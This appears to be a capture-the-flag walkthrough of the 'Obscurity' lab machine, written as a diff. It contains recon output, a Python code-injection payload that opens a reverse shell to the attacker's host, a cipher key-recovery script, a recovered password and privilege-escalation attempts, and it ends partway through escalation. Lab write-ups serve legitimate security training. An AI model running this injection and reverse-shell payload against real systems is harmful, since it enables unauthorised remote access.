@@ -1,0 +1,475 @@
+Obsurity
+
+
+root@kali:~# nmap -A -T4 -p- 10.10.10.168
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-04 20:08 EDT
+Nmap scan report for 10.10.10.168
+Host is up (0.29s latency).
+Not shown: 65531 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 05 Apr 2020 00:15:52
+|     Server: BadHTTPServer
+|     Last-Modified: Sun, 05 Apr 2020 00:15:52
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>0bscura</title>
+|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="keywords" content="">
+|     <meta name="description" content="">
+|     <!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     <!-- stylesheet css -->
+|     <link rel="stylesheet" href="css/bootstrap.min.css">
+|     <link rel="stylesheet" href="css/font-awesome.min.css">
+|     <link rel="stylesheet" href="css/templatemo-blue.css">
+|     </head>
+|     <body data-spy="scroll" data-target=".navbar-collapse">
+|     <!-- preloader section -->
+|     <!--
+|     <div class="preloader">
+|     <div class="sk-spinner sk-spinner-wordpress">
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 05 Apr 2020 00:15:53
+|     Server: BadHTTPServer
+|     Last-Modified: Sun, 05 Apr 2020 00:15:53
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8">
+|     <title>0bscura</title>
+|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+|     <meta name="viewport" content="width=device-width, initial-scale=1">
+|     <meta name="keywords" content="">
+|     <meta name="description" content="">
+|     <!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+|     <!-- stylesheet css -->
+|     <link rel="stylesheet" href="css/bootstrap.min.css">
+|     <link rel="stylesheet" href="css/font-awesome.min.css">
+|     <link rel="stylesheet" href="css/templatemo-blue.css">
+|     </head>
+|     <body data-spy="scroll" data-target=".navbar-collapse">
+|     <!-- preloader section -->
+|     <!--
+|     <div class="preloader">
+|_    <div class="sk-spinner sk-spinner-wordpress">
+|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.80%I=7%D=4/4%Time=5E8922A1%P=i686-pc-linux-gnu%r(GetRe
+SF:quest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sun,\x2005\x20Apr\x202020\
+SF:x2000:15:52\nServer:\x20BadHTTPServer\nLast-Modified:\x20Sun,\x2005\x20
+SF:Apr\x202020\x2000:15:52\nContent-Length:\x204171\nContent-Type:\x20text
+SF:/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\
+SF:">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n\t
+SF:<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<met
+SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
+SF:e=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20name=
+SF:\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Template
+SF:\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20style
+SF:sheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/bootst
+SF:rap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-awes
+SF:ome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templatem
+SF:o-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=\"
+SF:\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<div
+SF:\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-wo
+SF:rdpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Sun
+SF:,\x2005\x20Apr\x202020\x2000:15:53\nServer:\x20BadHTTPServer\nLast-Modi
+SF:fied:\x20Sun,\x2005\x20Apr\x202020\x2000:15:53\nContent-Length:\x204171
+SF:\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20htm
+SF:l>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<ti
+SF:tle>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20conte
+SF:nt=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
+SF:-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20content=
+SF:\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEasy
+SF:\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-profil
+SF:e\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet
+SF:\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\
+SF:x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\
+SF:x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"scr
+SF:oll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20sec
+SF:tion\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk-s
+SF:pinner\x20sk-spinner-wordpress\">\n");
+Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%), Linux 2.6.39 - 3.2 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   323.34 ms 10.10.14.1
+2   323.24 ms 10.10.10.168
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 339.02 seconds
+
+
+
+// use burpsuit + dirb, to scan the http://10.10.10.168:8080. 
+// check contents in this website. Found possible source code in “SuperSecureServer.py’”
+
+// use wfuzz to scan the site 
+
+root# wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+
+// get code
+
+oot@kali:~# wget http://10.10.10.168:8080/develop/SuperSecureServer.py
+--2020-04-04 20:10:58--  http://10.10.10.168:8080/develop/SuperSecureServer.py
+Connecting to 10.10.10.168:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5892 (5.8K) [text/plain]
+Saving to: ‘SuperSecureServer.py’
+
+SuperSecureServer.py             100%[==========================================================>]   5.75K  --.-KB/s    in 0.001s  
+
+2020-04-04 20:10:59 (10.1 MB/s) - ‘SuperSecureServer.py’ saved [5892/5892]
+
+// review source code , found revers shell under “path”
+
+// write a revers shell
+
+##################
+
+import requests
+import urllib
+import os
+
+url = 'http://10.10.10.168:8080/'
+
+path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.54”,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])\na=\''
+
+payload = urllib.parse.quote(path)
+print("payload")
+print(url+payload)
+
+r= requests.get(url+payload)
+print(r.headers)
+print(r.text)
+
+####################
+
+// set up a local listening port , and run the revises.py
+
+root# nc -lvp 4444
+
+root# python revers.py
+
+oot@kali:~# nc -lvp 4444
+listening on [any] 4444 ...
+10.10.10.168: inverse host lookup failed: Unknown host
+connect to [10.10.14.54] from (UNKNOWN) [10.10.10.168] 45002
+www-data@obscure:/$ 
+www-data@obscure:/$ whoami
+whoami
+www-data
+
+
+www-data@obscure:/$ find / type -d -user www-data
+
+www-data@obscure:/$ cd /tmp
+cd /tmp
+www-data@obscure:/tmp$ ls -la
+ls -la
+total 108
+drwxrwxrwt 11 root     root      4096 Apr  4 20:25 .
+drwxr-xr-x 24 root     root      4096 Oct  3  2019 ..
+-rw-r--r--  1 www-data www-data   109 Apr  4 17:53 check.txt
+drwxrwxrwt  2 root     root      4096 Apr  3 23:29 .font-unix
+drwxrwxrwt  2 root     root      4096 Apr  3 23:29 .ICE-unix
+-rw-r--r--  1 www-data www-data    93 Apr  4 13:22 key
+-rwxr-xr-x  1 www-data www-data 46631 Mar 18 18:24 linenum.sh
+-rw-r--r--  1 www-data www-data    14 Apr  4 13:31 pass
+-rw-r--r--  1 www-data www-data    14 Apr  4 07:18 pwrem.txt
+drwxrwxr-x  2 robert   robert    4096 Apr  4 14:03 SSH
+drwx------  3 root     root      4096 Apr  3 23:29 systemd-private-df92ff26668f43139443451f861774db-systemd-resolved.service-pb28ES
+drwx------  3 root     root      4096 Apr  3 23:29 systemd-private-df92ff26668f43139443451f861774db-systemd-timesyncd.service-tw3mA9
+drwxrwxrwt  2 root     root      4096 Apr  3 23:29 .Test-unix
+drwx------  2 root     root      4096 Apr  3 23:29 vmware-root_587-4013395661
+drwxrwxrwt  2 root     root      4096 Apr  3 23:29 .X11-unix
+drwxrwxrwt  2 root     root      4096 Apr  3 23:29 .XIM-unix
+www-data@obscure:/tmp$ bash linenum.sh
+bash linenum.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Sun Apr  5 00:58:15 UTC 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux obscure 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC 2019 x86_64 x86_64 x86_64 GNU/Linu
+
+// above actions are for recon 
+
+//then, check all the info under the Robert
+
+ww-data@obscure:/home/robert$ ls -la
+ls -la
+total 60
+drwxr-xr-x 7 robert robert 4096 Apr  4 07:23 .
+drwxr-xr-x 3 root   root   4096 Sep 24  2019 ..
+lrwxrwxrwx 1 robert robert    9 Sep 28  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
+drwx------ 2 robert robert 4096 Oct  3  2019 .cache
+-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
+drwxr-x--- 3 robert robert 4096 Dec  2 09:53 .config
+drwx------ 3 robert robert 4096 Oct  3  2019 .gnupg
+drwxrwxr-x 3 robert robert 4096 Oct  3  2019 .local
+-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
+-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
+-rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
+-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
+www-data@obscure:/home/robert$ cat check.txt
+cat check.txt
+Encrypting this file with your key should result in out.txt, make sure your key is correct! 
+www-data@obscure:/home/robert$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+www-data@obscure:/home/robert$ cat out.txt
+cat out.txt
+¦ÚÈêÚÞØÛÝÝ	×ÐÊß
+ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
+êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	vwww-data@obscure:/home/robert$ 
+
+www-data@obscure:/home/robert$ cat passwordreminder.txt
+cat passwordreminder.txt
+´ÑÈÌÉàÙÁÑé¯·¿kwww-data@obscure:/home/robert$ cat .bash_history
+cat .bash_history
+www-data@obscure:/home/robert$ 
+
+www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
+cat SuperSecureCrypt.py
+#################################
+import sys
+import argparse
+
+def encrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    encrypted = ""
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr + ord(keyChr)) % 255)
+        encrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return encrypted
+
+def decrypt(text, key):
+    keylen = len(key)
+    keyPos = 0
+    decrypted = ""
+    for x in text:
+        keyChr = key[keyPos]
+        newChr = ord(x)
+        newChr = chr((newChr - ord(keyChr)) % 255)
+        decrypted += newChr
+        keyPos += 1
+        keyPos = keyPos % keylen
+    return decrypted
+
+parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')
+
+parser.add_argument('-i',
+                    metavar='InFile',
+                    type=str,
+                    help='The file to read',
+                    required=False)
+
+parser.add_argument('-o',
+                    metavar='OutFile',
+                    type=str,
+                    help='Where to output the encrypted/decrypted file',
+                    required=False)
+
+parser.add_argument('-k',
+                    metavar='Key',
+                    type=str,
+                    help='Key to use',
+                    required=False)
+
+parser.add_argument('-d', action='store_true', help='Decrypt mode')
+
+args = parser.parse_args()
+
+banner = "################################\n"
+banner+= "#           BEGINNING          #\n"
+banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
+banner+= "################################\n"
+banner += "  ############################\n"
+banner += "  #        FILE MODE         #\n"
+banner += "  ############################"
+print(banner)
+if args.o == None or args.k == None or args.i == None:
+    print("Missing args")
+else:
+    if args.d:
+        print("Opening file {0}...".format(args.i))
+        with open(args.i, 'r', encoding='UTF-8') as f:
+            data = f.read()
+
+        print("Decrypting...")
+        decrypted = decrypt(data, args.k)
+
+        print("Writing to {0}...".format(args.o))
+        with open(args.o, 'w', encoding='UTF-8') as f:
+            f.write(decrypted)
+    else:
+        print("Opening file {0}...".format(args.i))
+        with open(args.i, 'r', encoding='UTF-8') as f:
+            data = f.read()
+
+        print("Encrypting...")
+        encrypted = encrypt(data, args.k)
+
+        print("Writing to {0}...".format(args.o))
+        with open(args.o, 'w', encoding='UTF-8') as f:
+            f.write(encrypted)
+
+###################################
+
+// question: 
+// unencrypted file: check.txt，
+// encrypted file: out.txt，
+// Algorithm encrypt method： supersecurecrypt.py 
+// Q to ask how to get key，
+// decrypt Python code:
+
+#################################
+
+import string
+
+with open('check.txt', 'r', encoding='utf-8') as f:
+    mingwen = f.read()
+
+key = ''
+
+with open('out.txt', 'r', encoding='utf-8') as f:
+    miwen = f.read()
+    for c in range(len(mingwen)):
+        for i in range(255):
+            ch = chr((ord(miwen[c]) - i) % 255)
+            if ch == mingwen[c]:
+                key += chr(i)
+                break
+print(key)
+
+###############################
+
+// got key : alexandrovich， then decrypt file : passwordreminder.txt
+
+www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/ps -k alexandrovich -d
+xandrovich -dSecureCrypt.py -i passwordreminder.txt -o /tmp/ps -k alex
+################################
+#           BEGINNING          #
+#    SUPER SECURE ENCRYPTOR    #
+################################
+  ############################
+  #        FILE MODE         #
+  ############################
+Opening file passwordreminder.txt...
+Decrypting...
+Writing to /tmp/ps...
+www-data@obscure:/home/robert$ cat /tmp/ps
+cat /tmp/ps
+SecThruObsFTW
+www-data@obscure:/home/robert$ 
+
+root@kali:~# ssh robert@10.10.10.168
+The authenticity of host '10.10.10.168 (10.10.10.168)' can't be established.
+ECDSA key fingerprint is SHA256:H6t3x5IXxyijmFEZ2NVZbIZHWZJZ0d1IDDj3OnABJDw.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.168' (ECDSA) to the list of known hosts.
+robert@10.10.10.168's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun Apr  5 02:15:24 UTC 2020
+
+  System load:  0.0               Processes:             126
+  Usage of /:   45.9% of 9.78GB   Users logged in:       0
+  Memory usage: 21%               IP address for ens160: 10.10.10.168
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+40 packages can be updated.
+0 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sat Apr  4 20:24:23 2020 from 10.10.14.67
+robert@obscure:~$ cat user.txt 
+
+
+robert@obscure:~/BetterSSH$ sudo -l
+Matching Defaults entries for robert on obscure:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User robert may run the following commands on obscure:
+    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
+Enter username: robert
+Enter password: SecThruObsFTW
+Authed!
+robert@Obscure$ 
+Output: 
+Error: sudo: : command not found
+
+robert@Obscure$ su - root
+Output: 
+Error: Password: 
+su: Authentication failure
+
+robert@Obscure$ 
+Output: 
+Error: sudo: : command not found
+
+robert@Obscure$ -u root cat /root/root.txt
+
+
+
